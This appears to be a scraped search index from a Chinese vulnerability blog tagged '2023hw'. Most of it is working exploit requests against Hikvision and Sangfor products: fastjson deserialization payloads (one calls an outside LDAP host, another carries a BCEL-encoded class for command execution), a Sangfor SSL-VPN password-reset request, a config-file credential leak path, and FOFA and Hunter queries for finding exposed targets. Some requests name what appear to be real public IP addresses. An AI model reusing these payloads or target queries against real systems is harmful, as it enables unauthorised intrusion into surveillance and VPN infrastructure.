fastjson命令执行漏洞 POST /bic/ssoService/v1/applyCT HTTP/1.1 Host: 127.0.0.1 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Sec-Fetch-User: ?1 Te: trailers Content-Type: application/json Content-Length: 204 {\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://kjvqweuoav.dnstunnel.run\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"} ","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86ivms-8700-fastjson%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"海康威视IVMS-8700 fastjson命令执行漏洞","uri":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86ivms-8700-fastjson%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"海康威视综合安防管理平台信息泄露 HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，海康威视综合安防管理平台信息存在信息泄露（内网集权账户密码）漏洞，可以通过解密软件，解密用户名密码。 ","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:1:0","tags":["2023hw漏洞"],"title":"海康威视综合安防管理平台信息泄露","uri":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"HIKVISION-综合安防管理平台\" ","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:2:0","tags":["2023hw漏洞"],"title":"海康威视综合安防管理平台信息泄露","uri":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw漏洞"],"content":"hunter web.title=\"综合安防管理平台\" ","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:3:0","tags":["2023hw漏洞"],"title":"海康威视综合安防管理平台信息泄露","uri":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw漏洞"],"content":"poc /portal/conf/config.properties ","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:4:0","tags":["2023hw漏洞"],"title":"海康威视综合安防管理平台信息泄露","uri":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 ","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:5:0","tags":["2023hw漏洞"],"title":"海康威视综合安防管理平台信息泄露","uri":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw漏洞"],"content":"海康威视运行管理中心fastjson漏洞 海康运行管理中心系统使用低版本的fastjson，攻击者可在未鉴权情况下获取服务器权限，且由于存在相关依赖，即使服务器不出网无法远程加载恶意类也可通过本地链直接命令执行，从而获取服务器权限。 ","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83fastjson%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw漏洞"],"title":"海康威视运行管理中心fastjson漏洞","uri":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83fastjson%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa header=\"X-Content-Type-Options: nosniff\" \u0026\u0026 body=\"\u003ch1\u003eWelcome to OpenResty!\u003c/h1\u003e\" \u0026\u0026 header=\"X-Xss-Protection: 1; mode=block\" ","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83fastjson%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"海康威视运行管理中心fastjson漏洞","uri":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83fastjson%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"exp POST /center/api/session HTTP/1.1 Host: your-ip Testcmd: whoami User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X -1_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Accept: application/json, text/plain, */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Content-Type: application/json;charset=UTF-8 X-Language-Type: zh_CN X-Requested-With: XMLHttpRequest {\"x\":{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83fastjson%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"海康威视运行管理中心fastjson漏洞","uri":"/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83fastjson%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rheader=\"X-Content-Type-Options: nosniff\" \u0026\u0026 body=\"\u003ch1\u003eWelcome to OpenResty!\u003c/h1\u003e\" \u0026\u0026 header=\"X-Xss-Protection: 1; mode=block\" ","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-centerapisession/:0:0","tags":["2023hw"],"title":"海康运行管理中心命令执行漏洞 centerapisession","uri":"/%E6%B5%B7%E5%BA%B7%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-centerapisession/"},{"categories":["2023hw"],"content":"poc POST /center/api/session HTTP/1.1 Host: 114.242.201.21:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X -1_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Accept: application/json, text/plain, */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json;charset=UTF-8 Testcmd: whoami X-Language-Type: zh_CN X-Requested-With: XMLHttpRequest Content-Length: 5778 {\"x\":{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"},\"c\":{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad","date":"2023-12-08","objectID":"/%E6%B5%B7%E5%BA%B7%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-centerapisession/:1:0","tags":["2023hw"],"title":"海康运行管理中心命令执行漏洞 centerapisession","uri":"/%E6%B5%B7%E5%BA%B7%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-centerapisession/"},{"categories":["2023hw"],"content":"SANGFOR SSL-VPN Arbitrary password reset vulnerability\r","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"深信服 SSL VPN 任意密码重置漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"fofa app=\"SANGFOR-SSL-VPN\" \u0026\u0026 icon_hash=\"-693794744\" ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"深信服 SSL VPN 任意密码重置漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp POST /por/changepwd.csp HTTP/1.1 Host: 103.139.212.214 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 172 sessReq=clusterd\u0026sessid=0\u0026str=26c2ebe58a8274ba6c3dbe6051e9d406a9122b7218ca21951330e1c8a968aeee5330fb838553b5d5101856fab8e0a0463921543cb63c6e47c0447e749a55d7ae210f68\u0026len=134 POST /por/changepwd.csp HTTP/1.1 Host: 103.139.212.214 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 172 sessReq=clusterd\u0026sessid=0\u0026str=6b83b24fdb5a1d451490f8b55fb09cd5287a942904fd6c23036e20884ced906921040534f18f514ff649127ec52d5664c491c655b3fa617b9f3ebcca9b3b74099fe783\u0026len=134 ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"深信服 SSL VPN 任意密码重置漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 深信服 应用交付管理系统 login 远程命令执行漏洞\r","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"深信服 应用交付管理系统 login 远程命令执行漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 深信服 应用交付管理系统 login 存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令 ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"深信服 应用交付管理系统 login 远程命令执行漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 深信服 应用交付管理系统 7.0.8-7.0.8R5 ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"深信服 应用交付管理系统 login 远程命令执行漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 fid=“iaytNA57019/kADk8Nev7g==\" ","date":"2023-12-08","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"深信服 应用交付管理系统 login 远程命令执行漏洞","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC POST /rep/login 